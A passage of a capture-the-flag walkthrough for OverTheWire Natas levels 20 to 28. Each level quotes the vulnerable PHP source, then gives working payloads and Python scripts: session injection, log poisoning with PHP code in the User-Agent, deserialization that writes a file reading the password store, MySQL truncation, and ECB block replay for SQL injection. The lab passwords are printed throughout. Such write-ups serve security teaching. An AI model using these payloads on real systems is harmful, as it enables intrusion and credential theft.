print_credentials(); 

$name = ""; 
if(array_key_exists("name", $_SESSION)) { 
    $name = $_SESSION["name"]; 
} 

?> 
```

Here we got lots of code but, let me simplify that for you. First, because of the `debug($msg)` function, we can get more details about the management of the sessions. 

For exemple, if you enter *natas* in the **name** field, submit it and change your URL with [http://natas20.natas.labs.overthewire.org/index.php?debug](http://natas20.natas.labs.overthewire.org/index.php?debug) you should get debug information :
![image-center](/images/otw/natas20_debug.png){: .align-center}
Second, we need the following conditions to get the password :

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
```

Third, the *mywrite()* function is faulty, check this extract :

```php
foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
```

Basically, it is writing each *$key* and *$value* pair with a new line. So, as we need a key/value pair of **admin:1**, we could inject our username followed by a new line character and the **admin:1**. 

Here, we just need to send the following URL :

```text
http://natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201
```

Then, you'll get the result !

```text
Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

## Решение Natas 21

**URL :** [http://natas21.natas.labs.overthewire.org](http://natas21.natas.labs.overthewire.org) <br/>
**Credentials :** *natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ*

Here is the PHP code for this challenge (first and second page):

```php
<? 
// Page 01
// http://natas21.natas.labs.overthewire.org/
function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas22\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22."; 
    } 
} 

session_start(); 
print_credentials(); 

?> 
```

And the code from the second page :

```php
// Page 02
// http://natas21-experimenter.natas.labs.overthewire.org/
<?   
session_start(); 

// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 

if(array_key_exists("debug", $_GET)) { 
    print "[DEBUG] Session contents:<br>"; 
    print_r($_SESSION); 
} 

// only allow these keys 
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow"); 
$form = ""; 

$form .= '<form action="index.php" method="POST">'; 
foreach($validkeys as $key => $defval) { 
    $val = $defval; 
    if(array_key_exists($key, $_SESSION)) { 
    $val = $_SESSION[$key]; 
    } else { 
    $_SESSION[$key] = $val; 
    } 
    $form .= "$key: <input name='$key' value='$val' /><br>"; 
} 
$form .= '<input type="submit" name="submit" value="Update" />'; 
$form .= '</form>'; 

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";"; 
$example = "<div style='$style'>Hello world!</div>"; 

?> 
```

So, here we have 2 sites, but it seems that we can use the cookie we will obtain on both of them. On the first website, [http://natas21.natas.labs.overthewire.org/](http://natas21.natas.labs.overthewire.org/), we just have a simple cookie check with the following condition :

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
```

However, on the second one, it seems that we can *forge* a cookie. Here, the vulnerable part of the code is the following one :

```php
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
} 
```

As we need a key/value pair of **admin/1** to get the password, we just need to inject it into the URL to forge a proper cookie. 

First we need to inject the key/value pair with the following query :

```text
http://natas21-experimenter.natas.labs.overthewire.org?submit&admin=1
```

Then, we get the *PHPSESSID* and use it on the first website. I used **Burp** to do that :
![image-center](/images/otw/natas21_query.png){: .align-center}
And, we got it !

```text
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

## Решение Natas 22

**URL :** [http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org) <br/>
**Credentials :** *natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ*

Here is the PHP code for this challenge :

```php
<? 
session_start(); 

if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
    header("Location: /"); 
    } 
} 
?> 

<? 
    if(array_key_exists("revelio", $_GET)) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas23\n"; 
    print "Password: <censored></pre>"; 
    } 
?> 
```

We have an empty page but, when you look at the source it looks fairly easy. We just need to add the **revelio** parameter to the query. Let's start *Burp* and check that out! Here, I just added `?revelio=1`to the query :
![image-center](/images/otw/natas23_request.png){: .align-center}
We have it !

```text
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

## Решение Natas 23

**URL :** [http://natas23.natas.labs.overthewire.org](http://natas23.natas.labs.overthewire.org) <br/>
**Credentials :** *natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE*

Here is the PHP code for this challenge :

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
?>  
```

So, the source is simple enough. The *strstr()* function compare the string `iloveyou` with our input and check if the string is larger than int(10). Weird...

However, after looking at the PHP documentation it seems that *strstr()* "Find the first occurrence of a string", so the string does not need to be equals to **iloveyou**, it justs need to be present into the string. Then, to bypass the second part of the string, I just added some number in front of the string, like that : **123iloveyou**.

And it worked :

```text
Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

## Решение Natas 24

**URL :** [http://natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org) <br/>
**Credentials :** *natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg*

Here is the PHP code for this challenge :

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
?>  
```

So, here we just have a password field. We need to have a valid comparison for the *strcmp()*. As per the PHP documentation, it will returns zero when the strings are equal. However, if we send the same request with an array to compare to, *strcmp()* will gives a warning because it expected to have a string but, it will return 0 !

Let's try the following request :

```text
http://natas24.natas.labs.overthewire.org/?passwd[]=0
```

As expected, we have a warning... and the password :

```text
GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

## Решение Natas 25

**URL :** [http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org) <br/>
**Credentials :** *natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c*

Here is the PHP code for this challenge :

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

Once again, complex code, simple answer. 

First, the path traversal check is vulnerable `$filename=str_replace("../","",$filename);` will remove the `../`. But, if you enter `.../...//`, it will remove two `../` but leave one `../`. So, we can inject a path into the *lang* parameter.

Second, the line `$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];` is vulnerable, because we can inject code into our user agent.

Third, the line `$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");` tells us what would be the filename of our log on the server.

Now, the exploit, 3 steps :

- Get our *session_id()* (**Burp** will do the trick)
- Retreive our log file by injecting the path of the password into the *lang* parameter
- Inject `<?php include '/etc/natas_webpass/natas26'; ?>` into the **User-Agent**

Here is the modified query :

![image-center](/images/otw/natas25_query.png){: .align-center}

And the result :

```text
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

## Решение Natas 26

**URL :** [http://natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org) <br/>
**Credentials :** *natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T*

Here is the PHP code for this challenge :

```php
<?php
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>
```

Here, we got some kind of line drawing application. If you check the source, look at all those *unserialize()* functions. It's definitly an exploit based on serialization. But where ? Well, if you take a closer look, you can see that the *Logger* class exists but is not used anywhere and we control the **drawing** cookie.

First, let's try to unserialize the *drawing* cookie :

```php
<?php

$drawing = unserialize(base64_decode("YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjM6IjEyMyI7czoyOiJ5MSI7czozOiIzMjEiO3M6MjoieDIiO3M6MjoiNTAiO3M6MjoieTIiO3M6MjoiNjAiO319"));
print_r($drawing);

?>
```

Here is the result :

```bash
$ php unserial.php
Array
(
    [0] => Array
        (
            [x1] => 123
            [y1] => 321
            [x2] => 50
            [y2] => 60
        )

)
```
As you can see, it represents the unserialized object of our drawing. Now, let's try to serialized a custom instance of the **Logger** class to read the password. I used the  **img** to write the password as it is readable/writable.

```php
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            $this->initMsg = "foobar\n";
            $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
            $this->logFile = "img/ax.php";
        }                       
                     
    }
$logger = new Logger();
echo base64_encode(serialize($logger));
?>
```

Execute it :

```bash
$ php natas26.php
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMDoiaW1nL2F4LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjc6ImZvb2JhcgoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiI7fQ==
```

Then replay the forged **drawing** cookie with *Burp*. Don't forget to urlencode the **/** and **=**.
![image-center](/images/otw/natas26_burp.png){: .align-center}
Then, try to access the file you just created :
![image-center](/images/otw/natas26_password.png){: .align-center}
Done.

```text
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

## Решение Natas 27

**URL :** [http://natas27.natas.labs.overthewire.org](http://natas27.natas.labs.overthewire.org) <br/>
**Credentials :** *natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ*

Here is the source code for this challenge :

```php
<? 
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

function checkCredentials($link,$usr,$pass){ 
  
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "SELECT username from users where username='$user' and password='$password' "; 
    $res = mysql_query($query, $link); 
    if(mysql_num_rows($res) > 0){ 
        return True; 
    } 
    return False; 
} 

function validUser($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            return True; 
        } 
    } 
    return False; 
} 

function dumpData($link,$usr){ 
     
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) { 
                // thanks to Gobo for reporting this bug!   
                //return print_r($row); 
                return print_r($row,true); 
            } 
        } 
    } 
    return False; 
} 

function createUser($link, $usr, $pass){ 

    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "INSERT INTO users (username,password) values ('$user','$password')"; 
    $res = mysql_query($query, $link); 
    if(mysql_affected_rows() > 0){ 
        return True; 
    } 
    return False; 
} 

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas27', '<censored>'); 
    mysql_select_db('natas27', $link); 
    

    if(validUser($link,$_REQUEST["username"])) { 
        //user exists, check creds 
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>"; 
            echo "Here is your data:<br>"; 
            $data=dumpData($link,$_REQUEST["username"]); 
            print htmlentities($data); 
        } 
        else{ 
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>"; 
        }         
    }  
    else { 
        //user doesn't exist 
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){  
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!"; 
        } 
    } 

    mysql_close($link); 
} else { 
?>
```

Basically, this code will check if the user exists in the database and if you got the right password, it will display the password. If the user does not exists, it will be created in the database.

If you try to login with the user **natas28** you'll see the following error :

```text
Wrong password for user: natas28
````

It means that the user exists. So, we need to find a way to obtains the password... This challenge was quite interesting as I never exploited MySQL this way !

If you check the beginning of the source code, you'll see the following lines :

```sql
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
```

It defines the size of the SQL field in the database and after some reading I found this weird behavior. 

If you create a user like **user** and a random password and create another user named **user** with enough space after the username to exceed the size of the SQL field and a random trailing characters and an empty password it will still get created. That due to the fact that MySQL will truncate the input to match the maximum field size.

Then if you try to login with the **user** username and an empty password you'll get the password! So, theorycally, if you create the following user with an empty password (note the character at the end of the string):

```text
natas28                                                                                                   x
```

Then, try to login with **natas28** without password, you'll get the flag :
![image-center](/images/otw/natas27_password.png){: .align-center}
Done.

```text
JWwR438wkgTsNKBbcJoowyysdM82YjeF
```

## Решение Natas 28

**URL :** [http://natas28.natas.labs.overthewire.org](http://natas28.natas.labs.overthewire.org) <br/>
**Credentials :** *natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF*

In this challenge we don't get the source code. After some test, I tried to mess with the *query* variable by removing some characters and got the following error :
![image-center](/images/otw/natas28_error.png){: .align-center}
Hum... It looks like the **query** variable is in fact some kind of cipher encoded with **Base64**. Let's write a quick script to get a larger sample. I also made sure to increment the size of the query to see if there is any differences.

```python
import requests
import binascii
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

sample = "aaaaaaaa"

while len(sample) < 16:
    data = {'query':sample}
    r = s.post(url, data=data)
    cipher = r.url.split('=')[1]
    cipher = urllib.parse.unquote(cipher)
    print("[*] %d chars.\t| %s" % (len(sample), cipher))
    sample += 'a'
```

Here are the results :

```text
[*] 0 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=
[*] 1 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
[*] 2 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
[*] 3 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=
[*] 4 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=
[*] 5 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=
[*] 6 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=
[*] 7 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=
[*] 8 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=
[*] 9 chars.    | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA=
[*] 10 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] 11 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
[*] 12 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
[*] 13 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
[*] 14 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
[*] 15 chars.   | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWu8qmX2iNj9yo/rTMtFzb6dz8xhQlKoBQI8fl9A304VnjFdz7MKPhw5PTrxsgHCk
```

As you can see, the first 32 bytes of the string is always the same. Also, when the string is 10 characters or larger, we have another pattern (*LAhy3ui8kLEVaROwiiI6Oe*) appended to the first one... 

Let's do another test by modifying the previous script with queries of 10 chars but with different chars for the 10th.

```python
import requests
import binascii
import urllib
import base64
import string

charset = string.ascii_lowercase

url = "http://natas28.natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

sample = "aaaaaaaaa"

for x in charset:
    data = {'query':sample+x}
    r = s.post(url, data=data)
    cipher = r.url.split('=')[1]
    cipher = urllib.parse.unquote(cipher)
    print("[*] last char. = %s | %s" % (x, cipher))
```

Interesting results :

```text
[*] last char. = a | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = b | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKCPMmZvbzQk9NC+JQAafwAc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = c | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKbNwAJ40Y4739F+KN0ABiBc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = d | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLyUrlNHGmbU5VOlSvIRSgHc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = e | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJgCZkJIP/TRxdxIEAEMjPDc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=

...[removed]...

[*] last char. = v | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJocuD0SNEswX+w7F1PAYP9c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = w | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIRdV6Y9QYP73MexfaN7a02c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = x | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJMzQgpLK531J6uhqGI3STjc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = y | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJq/IL8vzq2NsiU0FduYUIWc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = z | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPITVwDo9i6rKdJyANaW7USic4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
```

Based on the tests, we can assume that it is an **ECB** cipher based on **16 bytes blocks**. Those assumptions are based on 2 facts :

- The start/end of the string is always the same so, each block is encrypted independently with the same key.
- The only changing part is 16 bytes long.

You should note that :

- The block 1 & 2 don't seem to change
- The block 3 seems to chang, probably due to the changing charaters
- The block 4 and 5 don't seem to change either

Remember that when we talk about blocks it's 16 bytes chunks of data. I also discoverd weird changes when I tried to injection punctuation instead of a letter :

```text
[*] last char. = a | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oec4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = b | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKCPMmZvbzQk9NC+JQAafwAc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = c | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKbNwAJ40Y4739F+KN0ABiBc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = " | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOe0uzFQTQyTJF5uPUK3I8gMqM9OYQkTq645oGdhkgSlo=
[*] last char. = ' | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOstdkbwCSkbjZzJR1FrozncqM9OYQkTq645oGdhkgSlo=
[*] last char. = \ | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIR27gK4CQl3Jcmv/0YAxYOfN5woKhSkQjlY0g5eVSYncqM9OYQkTq645oGdhkgSlo=
[*] last char. = - | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIUFra9Df1lRzdwe7N9yKac4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = . | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIIceJ3g0x1znk8bFaqi59Pc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = / | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL+kURx48/lnPaQYziuoMEKc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
[*] last char. = : | G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIcthQDmC0uZUSnNjBCzetpc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
```

I tried all the punctuation characters, but only **"** (double quote), **'** (single quote) and **\\** (backslash) showed a change in the 4th block. But, what's weird it that the 3rd block is now identical for those 3 punctuation characters (*IR27gK4CQl3Jcmv/0YAxYO*). This behavior tells us 2 things :

- There is probably an escaping mecanism because the the 4th block is changing so, 1 char became 2 char. Our string is now 11 chars long and it overflow in the 4th block, hence the change.
- The escape characters is the same and is propably **\\**. We can tell that because the 3rd block is always identical when we use **"**, **'** and **\\**.

Back to the Web page, if you search something like **x**, you'll get a result :
![image-center](/images/otw/natas28_results.png){: .align-center}
It means that we probably have some kind of SQL database in the backend. Based on the previous level, probably **MySQL**. It also means that our previous assumptions concerning a sanitization mecanism could be true.

What now ? Well, it's probably a SQL injection. However, we can't send it directly in cleartext beacause of the sanitization but, we could bypass it using the behavior of the **ECB** cipher. 

As, it is probably an SQLi, we'll need to inject a **'** (quote) to close the previous query. Luckily, in our case, the code break the input string into 16 bytes blocks and encrypt it with the same key. It mean that we could send some cleartext, get the ciphertext from an identified block of 16 bytes and replay it !

Finally, to bypass the input sanitization, we could send the following query :

- Block 1 = "AAAAAAAAA'" (10 chars, last one is a single quote)
- Block 2 = "SQL Injection" (10 chars)
- Block x = "More SQL Injection" (10 chars)

And the returned query should contain :

- Block 1 = "AAAAAAAAA\\" (10 chars)
- Block 2 = "'SQL Injection" (note the **'** at the beginning)
- Block x = "More SQL Injection..."

Because the escaping charaters **\\**, should stay in the first block and the escaped characters **'** should overflow in the second block. Now we just need to get rid of the first block and replay the others.

Let's recap :

- We will generate a baseline by sending a query with **10** spaces
- We will send the SQLi prepended by **9** spaces and a **quote*
- We will compute the number of blocks containing our SQLi
- Then we forge a ciphertext using our baseline (empty string), the SQLi and the footer of the baseline

Now, the script :

```python
import requests
import urllib
import base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

# First we generate a baseline for the header/footer
data = {'query':10 * ' '}
r = s.post(url, data=data)
baseline = urllib.parse.unquote(r.url.split('=')[1])
baseline = base64.b64decode(baseline.encode('utf-8'))
header = baseline[:48]
footer = baseline[48:]

# We generate the ciphertext query and parse the result
